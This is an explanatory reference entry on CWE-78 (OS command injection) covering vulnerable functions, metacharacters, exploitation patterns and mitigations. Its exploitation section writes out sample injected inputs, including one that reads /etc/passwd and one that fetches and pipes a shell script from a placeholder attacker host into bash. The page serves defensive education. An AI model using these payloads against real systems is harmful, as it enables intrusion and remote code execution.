---
title: "CWE-78 — OS Command Injection: Improper Neutralization of Special Elements"
published_date: 2006-07-19
last_modified: 2023-10-26
---

# CWE-78 — OS Command Injection

CWE-78 (Improper Neutralization of Special Elements used in an OS Command) describes vulnerabilities where an application passes user-controlled data to a system shell or OS command execution function without adequate sanitization. An attacker can inject shell metacharacters to execute arbitrary OS commands with the privileges of the application process.

## Technical Details

Command injection arises when applications pass user input to functions like `system()`, `exec()`, `popen()`, `os.system()`, `subprocess.call(shell=True)`, or backtick execution in PHP/Perl/Ruby. Shell metacharacters enabling injection include: semicolon (`;cmd`), pipe (`| cmd`), command substitution (`` `cmd` `` or `$(cmd)`), logical operators (`&& cmd`, `|| cmd`), newline injection, and null byte termination. Context matters: injection into a shell command string differs from injection into an argument list. Even when the `shell=False` equivalent is used, argument injection (CWE-88) may still be possible if an unsafe subprocess argument is constructed.

## Exploitation Patterns

A classic example: a web application performs `ping -c 1 <user_ip>`. An attacker supplies `127.0.0.1; cat /etc/passwd` or `127.0.0.1 && curl http://attacker.com/shell.sh | bash`. Blind command injection — where no output is returned — can be confirmed via time-based techniques (`sleep 10`) or out-of-band DNS/HTTP callbacks. Tools like Commix automate command injection detection and exploitation. Command injection frequently appears in network device firmware, IoT devices, and embedded web interfaces where shell commands are used heavily.

## Mitigation

Never pass user input directly to shell execution functions. Use parameterized APIs that accept command and arguments as separate lists (e.g., `subprocess.run([cmd, arg1, arg2], shell=False)` in Python). If shell execution is unavoidable, strictly allowlist the permitted characters in user input. Apply input validation at the point of use, not just at application entry points. Run applications with minimal OS privileges. Regularly audit code for uses of `system()`, `exec()`, `popen()`, and shell=True patterns.
